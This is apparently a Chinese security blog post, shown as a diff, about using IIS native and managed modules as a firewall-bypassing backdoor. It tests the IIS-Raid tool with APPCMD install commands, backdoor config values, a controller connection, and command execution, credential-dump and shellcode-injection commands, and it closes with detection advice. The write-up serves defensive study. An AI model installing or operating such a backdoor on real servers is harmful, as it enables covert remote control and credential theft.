@@ -1,0 +1,300 @@
+I"6+<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在之前的文章<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99">《利用IIS的端口共享功能绕过防火墙》</a>曾介绍了如下问题的解决方法：
+Windows服务器开启了IIS服务，防火墙仅允许80或443端口进行通信，那么如何在不使用webshell的前提下，实现对该服务器的远程管理？更进一步，如果只有低权限，有没有办法呢？
+本文将介绍以上问题的另一种解决方法：利用IIS的模块功能绕过防火墙</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>IIS的模块功能</li>
+  <li>使用c++开发模块</li>
+  <li>使用c#开发模块</li>
+  <li>IIS-Raid测试</li>
+  <li>利用分析</li>
+  <li>防御检测</li>
+</ul>
+
+<h2 id="0x02-iis的模块功能">0x02 IIS的模块功能</h2>
+<hr />
+
+<p>自IIS7开始，开发人员可以通过模块功能(Module)来扩展IIS的功能</p>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-gb/iis/develop/runtime-extensibility/extending-web-server-functionality-in-net</p>
+
+<p>如果我们通过模块功能可以读取HTTP请求的内容并控制HTTP回复的内容，完全可以利用模块功能实现对服务器的远程管理</p>
+
+<p>IIS的模块以DLL的形式存在，加载后不会存在单独的进程</p>
+
+<p>2018年，PaloAlto Unit42发现了APT34使用这种方式作为IIS后门，将其命名为RGDoor</p>
+
+<p>本文将复现RGDoor的部分功能，着重介绍这种利用方法的检测和识别</p>
+
+<h2 id="0x03-使用c开发模块">0x03 使用c++开发模块</h2>
+<hr />
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-gb/iis/develop/runtime-extensibility/develop-a-native-cc-module-for-iis</p>
+
+<p>IIS 7.0及更高版本允许通过以两种方式开发的模块来扩展服务器：</p>
+
+<ul>
+  <li>托管模块(Managed Module)，使用托管代码(managed code)和ASP.NET服务器可扩展性API</li>
+  <li>本机模块(Native Module)，使用本机代码(native code)和IIS本机服务器可扩展性API</li>
+</ul>
+
+<p>参考资料中介绍了本机模块(Native Module)的使用方法</p>
+
+<p>需要注意以下问题：</p>
+
+<ul>
+  <li>可以使用Visual Studio进行开发</li>
+  <li>DLL需要包含导出函数RegisterModule</li>
+  <li>使用CHttpModule作为模块类继承的实现</li>
+  <li>使用IHttpModuleFactory接口创建模块实例</li>
+</ul>
+
+<h3 id="1模块开发">1.模块开发</h3>
+
+<p>具体的实现代码可以参考IIS-Raid，地址如下：</p>
+
+<p>https://github.com/0x09AL/IIS-Raid</p>
+
+<p>代码细节可参考：</p>
+
+<p>https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/</p>
+
+<p>IIS-Raid在<code class="language-plaintext highlighter-rouge">RegisterModule</code>函数注册了<code class="language-plaintext highlighter-rouge">RQ_BEGIN_REQUEST</code>和<code class="language-plaintext highlighter-rouge">RQ_SEND_RESPONSE</code>两个事件用来处理请求和响应</p>
+
+<h3 id="2模块注册">2.模块注册</h3>
+
+<p>可选择以下三种方法：</p>
+
+<ol>
+  <li>使用APPCMD.EXE命令行工具</li>
+  <li>使用IIS Administration Tool进行界面操作</li>
+  <li>修改配置文件applicationHost.config</li>
+</ol>
+
+<p><strong>注：</strong></p>
+
+<p>在0x05中会演示方法1和方法2</p>
+
+<h2 id="0x04-使用c开发模块">0x04 使用c#开发模块</h2>
+<hr />
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-gb/iis/develop/runtime-extensibility/developing-a-module-using-net</p>
+
+<p>IIS 7.0及更高版本允许通过以两种方式开发的模块来扩展服务器：</p>
+
+<ul>
+  <li>托管模块(Managed Module)，使用托管代码(managed code)和ASP.NET服务器可扩展性API</li>
+  <li>本机模块(Native Module)，使用本机代码(native code)和IIS本机服务器可扩展性API</li>
+</ul>
+
+<p>参考资料中介绍了托管模块(Managed Module)的使用方法</p>
+
+<p>需要注意以下问题：</p>
+
+<ul>
+  <li>可以使用Visual Studio进行开发</li>
+  <li>是一个.NET类</li>
+  <li>使用System.Web.IHttpModule接口</li>
+</ul>
+
+<h3 id="1模块开发-1">1.模块开发</h3>
+
+<p>具体的实现代码可以参考IIS_backdoor，地址如下：</p>
+
+<p>https://github.com/WBGlIl/IIS_backdoor</p>
+
+<p>代码细节可参考：</p>
+
+<p>https://mp.weixin.qq.com/s/z1d3yvp14GWakyonTh_b8A</p>
+
+<h3 id="2模块注册-1">2.模块注册</h3>
+
+<p>可选择以下三种方法：</p>
+
+<ol>
+  <li>使用APPCMD.EXE命令行工具</li>
+  <li>使用IIS Administration Tool进行界面操作</li>
+  <li>修改配置文件web.config</li>
+</ol>
+
+<p>具体的使用方法还可以参考以下资料：</p>
+
+<p>https://docs.microsoft.com/en-gb/iis/develop/runtime-extensibility/developing-iis-modules-and-handlers-with-the-net-framework</p>
+
+<p>https://docs.microsoft.com/en-us/previous-versions/aspnet/ms227673(v=vs.100)</p>
+
+<h2 id="0x05-iis-raid测试">0x05 IIS-Raid测试</h2>
+<hr />
+
+<p>测试系统：</p>
+
+<p>Windows Server 2012r2 x64(需要获得管理员权限)</p>
+
+<p>IIS-Raid地址如下：</p>
+
+<p>https://github.com/0x09AL/IIS-Raid</p>
+
+<p>使用Visual Studio编译生成IIS-Backdoor.dll</p>
+
+<h3 id="1后门安装">1.后门安装</h3>
+
+<p>可以选择以下两种方法：</p>
+
+<h4 id="1使用appcmdexe命令行工具">(1)使用APPCMD.EXE命令行工具</h4>
+
+<p>查看已安装模块的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32\inetsrv\APPCMD.EXE list module
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/2-1.png" alt="Alt text" /></p>
+
+<p>安装模块的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:test /image:"c:\test\IIS-Backdoor.dll" /add:true
+</code></pre></div></div>
+
+<p>删除模块的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32\inetsrv\APPCMD.EXE uninstall module test
+</code></pre></div></div>
+
+<h4 id="2使用iis-administration-tool进行界面操作">(2)使用IIS Administration Tool进行界面操作</h4>
+
+<p>运行inetmgr.exe，进入IIS管理器</p>
+
+<p>选择<code class="language-plaintext highlighter-rouge">Modules</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/2-2.png" alt="Alt text" /></p>
+
+<p>进入后选择<code class="language-plaintext highlighter-rouge">Configure Native Modules...</code>，接着选择<code class="language-plaintext highlighter-rouge">Register...</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/2-3.png" alt="Alt text" /></p>
+
+<p>填入Name和Path，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/2-4.png" alt="Alt text" /></p>
+
+<p>添加成功后，在Modules页面显示新添加的内容，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/2-5.png" alt="Alt text" /></p>
+
+<h3 id="2功能测试">2.功能测试</h3>
+
+<p>IIS-Raid的配置文件保存在Functions.h中，包括以下内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define COM_HEADER "X-Chrome-Variations"
+#define PASS_FILE "C:\\Windows\\Temp\\creds.db"
+#define PASSWORD "SIMPLEPASS"
+</code></pre></div></div>
+
+<p>COM_HEADER是用于执行后门与控制器之间的通信的标头名称</p>
+
+<p>PASS_FILE是使用dump命令读取文件的位置</p>
+
+<p>PASSWORD定义是将用于向后门进行身份验证的密码</p>
+
+<h4 id="1连接后门">(1)连接后门</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ./iis_controller.py  --url http://192.168.18.138/ --password SIMPLEPASS
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/3-1.png" alt="Alt text" /></p>
+
+<h4 id="2测试功能">(2)测试功能</h4>
+
+<p>执行cmd命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd whoami
+</code></pre></div></div>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/3-2.png" alt="Alt text" /></p>
+
+<p>执行dump命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dump
+</code></pre></div></div>
+
+<p>默认读取文件<code class="language-plaintext highlighter-rouge">C:\\Windows\\Temp\\creds.db</code>中的内容</p>
+
+<p>测试如下图3-3</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/3-3.png" alt="Alt text" /></p>
+
+<p>执行shellcode：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inject shellcode.txt
+</code></pre></div></div>
+
+<p>shellcode.txt保存base64加密后的shellcode，加载方式为先创建进程<code class="language-plaintext highlighter-rouge">C:\\Windows\\System32\\credwiz.exe</code>，再进行注入</p>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-1/3-4.png" alt="Alt text" /></p>
+
+<h2 id="0x06-利用分析">0x06 利用分析</h2>
+<hr />
+
+<p>利用IIS模块作为后门具有以下特点：</p>
+
+<ul>
+  <li>需要先获得IIS服务器的管理员权限</li>
+  <li>payload为dll的形式</li>
+  <li>通过安装模块的方式启动</li>
+  <li>dll所在的进程为w3wp.exe</li>
+</ul>
+
+<h2 id="0x07-防御检测">0x07 防御检测</h2>
+<hr />
+
+<p>可以通过查看Modules的方式检测IIS是否被安装后门</p>
+
+<p>具体有以下两种方法：</p>
+
+<h4 id="1使用appcmdexe命令行工具-1">1.使用APPCMD.EXE命令行工具</h4>
+
+<p>查看已安装模块的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32\inetsrv\APPCMD.EXE list module
+</code></pre></div></div>
+
+<h4 id="2使用iis-administration-tool进行界面操作-1">2.使用IIS Administration Tool进行界面操作</h4>
+
+<p>运行inetmgr.exe，进入IIS管理器</p>
+
+<p>选择<code class="language-plaintext highlighter-rouge">Modules</code></p>
+
+<p>另外需要注意的是只有当模块被成功加载后，进程w3wp.exe中才能找到模块相关的dll</p>
+
+<h2 id="0x08-小结">0x08 小结</h2>
+<hr />
+
+<p>本文对IIS的模块功能进行介绍，实现了利用IIS的模块功能绕过防火墙，测试开源工具IIS-Raid，分享防御检测的建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
